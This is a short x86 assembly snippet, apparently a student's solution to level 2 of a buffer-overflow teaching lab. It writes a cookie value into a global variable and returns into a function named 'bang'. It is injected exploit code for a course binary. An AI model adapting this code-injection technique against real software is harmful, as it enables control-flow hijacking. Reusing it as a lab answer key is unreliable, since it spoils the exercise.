# exploit code for level 2
movl	$0x32af7935, 0x0804d124	# store my cookie in global_value
pushl	$0x08048e72				# push the address of bang
ret								# return to bang
